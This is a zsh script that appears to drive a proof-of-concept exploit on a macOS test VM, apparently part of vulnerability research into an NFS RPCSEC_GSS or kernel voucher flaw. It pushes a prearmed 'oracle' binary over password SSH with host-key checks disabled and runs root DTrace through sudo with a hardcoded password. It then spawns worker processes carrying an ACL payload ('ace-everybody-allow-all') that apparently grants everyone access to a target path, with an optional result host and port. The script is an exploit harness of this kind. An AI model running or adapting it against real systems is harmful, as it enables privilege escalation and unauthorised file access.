#!/bin/zsh

set -u
set -o pipefail

host=${1:-192.168.64.84}
workers=${2:-8}
count=${3:-512}
map_log=${4:-/Users/dawgyg/codex_scratch/nfs_beta4_static_20260727/voucher_selective_latest.map}
acl_operation=${5:-access}
triples_per_worker=${6:-1}
result_host=${7:-}
result_port=${8:-0}
stage2_delay_us=${9:-0}
payload=${VOUCHER32_SETUP_PAYLOAD:-ace-everybody-allow-all}
acl_target=${VOUCHER32_SETUP_ACL_TARGET:-/Users/testtest/acl_oracle/target}
user=${RPC_GSS_VM_USER:-testtest}
password=test
root=/Users/dawgyg/codex_scratch/nfs_beta4_static_20260727
lane=/Users/dawgyg/codex_lanes/nfs_rpcsecgss_poc
ssh_opts=(
	-o ConnectionAttempts=3
	-o ConnectTimeout=5
	-o ControlMaster=auto
	-o ControlPath=/tmp/codex-v32-select-%C
	-o ControlPersist=120
	-o IdentitiesOnly=yes
	-o NumberOfPasswordPrompts=1
	-o PasswordAuthentication=yes
	-o PubkeyAuthentication=no
	-o PreferredAuthentications=password
	-o StrictHostKeyChecking=no
	-o UserKnownHostsFile=/dev/null
)

if [[ "${acl_operation}" != access &&
    "${acl_operation}" != read &&
    "${acl_operation}" != write &&
    "${acl_operation}" != mkdir ]]; then
	print -u2 "invalid ACL operation: ${acl_operation}"
	exit 2
fi
if [[ "${payload}" != ace-everybody-allow-all &&
    "${payload}" != ace-everybody-allow-all-dir-inherit ]]; then
	print -u2 "invalid voucher payload: ${payload}"
	exit 2
fi
if [[ ! "${acl_target}" =~ '^/[A-Za-z0-9_./-]+$' ]]; then
	print -u2 "invalid ACL target: ${acl_target}"
	exit 2
fi
if (( triples_per_worker < 1 || triples_per_worker > 16 )); then
	print -u2 "invalid triples per worker: ${triples_per_worker}"
	exit 2
fi
if [[ -n "${result_host}" ]] &&
    [[ ! "${result_host}" =~ '^[0-9]+(\.[0-9]+){3}$' ]]; then
	print -u2 "invalid result host: ${result_host}"
	exit 2
fi
if (( result_port < 0 || result_port > 65535 )); then
	print -u2 "invalid result port: ${result_port}"
	exit 2
fi
if [[ ! "${stage2_delay_us}" =~ '^[0-9]+$' ]] ||
    (( stage2_delay_us > 1000000 )); then
	print -u2 "invalid helper stage-2 delay: ${stage2_delay_us}"
	exit 2
fi

connected=0
for attempt in $(seq 1 8); do
	if sshpass -p "${password}" ssh "${ssh_opts[@]}" \
	    "${user}@${host}" true >/dev/null 2>&1; then
		connected=1
		break
	fi
	sleep 1
done
if (( connected == 0 )); then
	print -u2 "could not establish VM SSH control connection"
	exit 1
fi

sshpass -p "${password}" scp "${ssh_opts[@]}" \
    "${lane}/voucher32_prearmed_oracle" \
    "${root}/trace_voucher32_select_triple_beta4.d" \
    "${user}@${host}:/Users/testtest/" >/dev/null ||
    exit 1

sshpass -p "${password}" ssh "${ssh_opts[@]}" "${user}@${host}" \
    "set -e
    setopt NULL_GLOB
    pkill -TERM -f '^/Users/testtest/v32select ' 2>/dev/null || true
    printf 'test\\n' | sudo -S pkill -TERM -f 'dtrace.*trace_voucher32_select_triple_beta4' 2>/dev/null || true
    sleep 0.2
    pkill -KILL -f '^/Users/testtest/v32select ' 2>/dev/null || true
    cp /Users/testtest/voucher32_prearmed_oracle /Users/testtest/v32select
    chmod +x /Users/testtest/v32select
    rm -f /Users/testtest/v32_select.* /Users/testtest/v32_select_helper.*.log \
        /Users/testtest/v32_select_pids /Users/testtest/v32_select_trace.out \
        /Users/testtest/v32_select_trace.stderr
    printf 'test\\n' | sudo -S nohup /usr/sbin/dtrace -w \
        -o /Users/testtest/v32_select_trace.out \
        -s /Users/testtest/trace_voucher32_select_triple_beta4.d \
        >/Users/testtest/v32_select_trace.stderr 2>&1 &
    echo \$! >/Users/testtest/v32_select_dtrace_pid" ||
    exit 1

for attempt in $(seq 1 400); do
	if sshpass -p "${password}" ssh "${ssh_opts[@]}" \
	    "${user}@${host}" \
	    "grep -q trace_begin /Users/testtest/v32_select_trace.out" \
	    >/dev/null 2>&1; then
		break
	fi
	sleep 0.025
done
if (( attempt == 400 )); then
	print -u2 "selection DTrace did not start"
	exit 1
fi

sshpass -p "${password}" ssh "${ssh_opts[@]}" "${user}@${host}" \
    "set -e
    for worker in \$(seq 0 $((workers - 1))); do
        base=\$((30000 + worker * ${count}))
	        env VOUCHER32_PAYLOAD=${payload} \
	            VOUCHER32_ACL_TARGET=${acl_target} \
	            VOUCHER32_ACL_OPERATION=${acl_operation} \
	            VOUCHER32_THREADED_STAGE2=1 \
	            VOUCHER32_STAGE2_DELAY_US=${stage2_delay_us} \
	            VOUCHER32_RESULT_HOST=${result_host} \
	            VOUCHER32_RESULT_PORT=${result_port} \
	            VOUCHER32_SELECT_PREFIX=/Users/testtest/v32_select \
            /Users/testtest/v32select ${count} selective \${base} \
            >/Users/testtest/v32_select_helper.\${worker}.log 2>&1 &
        echo \$! >>/Users/testtest/v32_select_pids
    done" ||
    exit 1

for attempt in $(seq 1 800); do
	ready=$(sshpass -p "${password}" ssh "${ssh_opts[@]}" \
	    "${user}@${host}" \
	    "grep -l '^voucher_selective_prearmed ' \
	        /Users/testtest/v32_select_helper.*.log 2>/dev/null |
	        wc -l | tr -d ' '" 2>/dev/null)
	if [[ ${ready:-0} -eq ${workers} ]]; then
		break
	fi
	sleep 0.025
done
if [[ ${ready:-0} -ne ${workers} ]]; then
	print -u2 "selective helpers did not prearm: ${ready:-0}/${workers}"
	exit 1
fi

selection_output=$(
sshpass -p "${password}" ssh "${ssh_opts[@]}" "${user}@${host}" '
    set -e
    for pid in $(cat /Users/testtest/v32_select_pids); do
        line=$(awk -v wanted="${pid}" \
            '"'"'$0 ~ ("VOUCHER_TRIPLE pid=" wanted " ") { print; exit }'"'"' \
            /Users/testtest/v32_select_trace.out)
        test -n "${line}"
        a=$(printf "%s\n" "${line}" | sed -n "s/.* a_idx=\([0-9][0-9]*\).*/\1/p")
        b=$(printf "%s\n" "${line}" | sed -n "s/.* b_idx=\([0-9][0-9]*\).*/\1/p")
        c=$(printf "%s\n" "${line}" | sed -n "s/.* c_idx=\([0-9][0-9]*\).*/\1/p")
        printf "%s %s %s\n" "${a}" "${b}" "${c}" \
            >"/Users/testtest/v32_select.${pid}"
        printf "selected %s\n" "${line}"
    done
    for pid in $(cat /Users/testtest/v32_select_pids); do
        test -s "/Users/testtest/v32_select.${pid}"
        kill -0 "${pid}"
    done
    printf "helpers_prearmed=%s\n" \
        "$(wc -l </Users/testtest/v32_select_pids | tr -d " ")"
    printf "helper_pids=%s\n" \
        "$(tr "\n" " " </Users/testtest/v32_select_pids)"
    printf "ready_before_release=%s\n" \
        "$(grep -l "^voucher_selective_ready " \
            /Users/testtest/v32_select_helper.*.log 2>/dev/null |
            wc -l | tr -d " ")"
    printf "test\n" | sudo -S pkill -TERM -f \
        "dtrace.*trace_voucher32_select_triple_beta4" 2>/dev/null || true
'
)
selection_status=$?
print -r -- "${selection_output}" | tee "${map_log}"
if (( selection_status != 0 )); then
	print -u2 "selective mapping incomplete; cleaning the partial cohort"
	sshpass -p "${password}" ssh "${ssh_opts[@]}" "${user}@${host}" '
	    if [[ -f /Users/testtest/v32_select_pids ]]; then
	        while read -r pid; do
	            kill -TERM "${pid}" 2>/dev/null || true
	        done </Users/testtest/v32_select_pids
	    fi
	    printf "test\n" | sudo -S pkill -TERM -f \
	        "dtrace.*trace_voucher32_select_triple_beta4" 2>/dev/null || true
	    sleep 0.2
	    pkill -KILL -f "^/Users/testtest/v32select " 2>/dev/null || true
	    rm -f /Users/testtest/v32_select_pids \
	        /Users/testtest/v32_select.[0-9]*
	' >/dev/null 2>&1 || true
	exit 1
fi

if (( triples_per_worker > 1 )); then
	dense_map=$(sshpass -p "${password}" ssh "${ssh_opts[@]}" \
	    "${user}@${host}" \
	    "TRIPLES_PER_WORKER=${triples_per_worker} /bin/zsh -s" <<'REMOTE'
set -e
for pid in $(cat /Users/testtest/v32_select_pids); do
	gate="/Users/testtest/v32_select.${pid}"
	: >"${gate}"
	awk -v wanted="${pid}" -v limit="${TRIPLES_PER_WORKER}" \
	    -v gate="${gate}" '
	    $0 ~ ("VOUCHER_TRIPLE pid=" wanted " ") && selected < limit {
	        a = b = c = ""
	        for (field = 1; field <= NF; field++) {
	            split($field, pair, "=")
	            if (pair[1] == "a_idx") a = pair[2]
	            if (pair[1] == "b_idx") b = pair[2]
	            if (pair[1] == "c_idx") c = pair[2]
	        }
	        if (a == "" || b == "" || c == "" ||
	            used[a] || used[b] || used[c]) next
	        print a, b, c >> gate
	        used[a] = used[b] = used[c] = 1
	        print "dense_selected " $0
	        selected++
		    }
		    END {
		        if (selected == 0) {
		            printf "pid %d had no disjoint triples\n",
		                wanted > "/dev/stderr"
		            exit 1
		        }
		        printf "dense_worker pid=%d selected=%d limit=%d\n",
		            wanted, selected, limit
		    }
		' /Users/testtest/v32_select_trace.out
done
total_candidate_as=0
for pid in $(cat /Users/testtest/v32_select_pids); do
	total_candidate_as=$((total_candidate_as +
	    $(wc -l <"/Users/testtest/v32_select.${pid}")))
done
printf "dense_helpers=%s triples_per_worker=%s total_candidate_as=%s\n" \
    "$(wc -l </Users/testtest/v32_select_pids | tr -d " ")" \
    "${TRIPLES_PER_WORKER}" \
    "${total_candidate_as}"
REMOTE
	) || exit 1
	print -r -- "${dense_map}" | tee -a "${map_log}"
fi

print "map_log=${map_log}"
print "acl_operation=${acl_operation}"
print "payload=${payload}"
print "acl_target=${acl_target}"
print "triples_per_worker=${triples_per_worker}"
print "result_endpoint=${result_host:-disabled}:${result_port}"
print "helper_stage2_delay_us=${stage2_delay_us}"
